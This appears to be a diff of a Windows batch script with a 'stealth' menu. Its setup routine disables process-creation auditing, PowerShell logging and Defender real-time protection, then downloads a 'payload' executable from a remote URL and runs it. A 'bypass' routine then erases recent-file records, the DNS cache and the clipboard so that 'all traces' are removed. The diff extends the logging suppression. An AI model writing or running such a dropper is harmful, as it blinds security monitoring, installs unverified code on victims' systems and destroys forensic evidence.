@@ -155,16 +155,21 @@ goto STEALTH_MENU
 
 :SETUP
 echo Disabling process creation auditing...
-powershell -Command "auditpol /set /subcategory:'Process Creation' /success:disable /failure:disable" >nul
+auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
+
+echo Disabling PowerShell logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f >nul 2>&1
 
 echo Disabling Windows Defender real-time protection...
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
 echo STEP 3: Downloading payload (CAXVN.exe)...
+
 powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
 
 if exist "%SETUP_EXE%" (
@@ -175,8 +180,16 @@ if exist "%SETUP_EXE%" (
     goto STEALTH_MENU
 )
 
-echo Re-enabling process auditing...
-powershell -Command "auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable" >nul
+echo Re-enabling Windows Defender real-time protection...
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
+
+echo Re-enabling PowerShell logging...
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f >nul 2>&1
+
+echo Re-enabling process creation auditing...
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
+
 pause
 goto STEALTH_MENU
 
@@ -207,13 +220,6 @@ goto STEALTH_MENU
 :BYPASS
 echo Running cleanup...
 
-:: Re-enable Defender
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul
-echo Re-enabled Defender real-time protection.
-
-:: Re-enable auditing (if not already)
-powershell -Command "auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable" >nul
-
 :: Clear recent files
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
 
@@ -234,6 +240,16 @@ ipconfig /flushdns >nul
 
 :: Clear clipboard
 echo off | clip
+
+:: Re-enable process creation auditing in case disabled
+auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
+
+:: Re-enable PowerShell logging
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: Re-enable Windows Defender real-time protection
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
 
 echo Cleanup done. All traces removed.
 pause
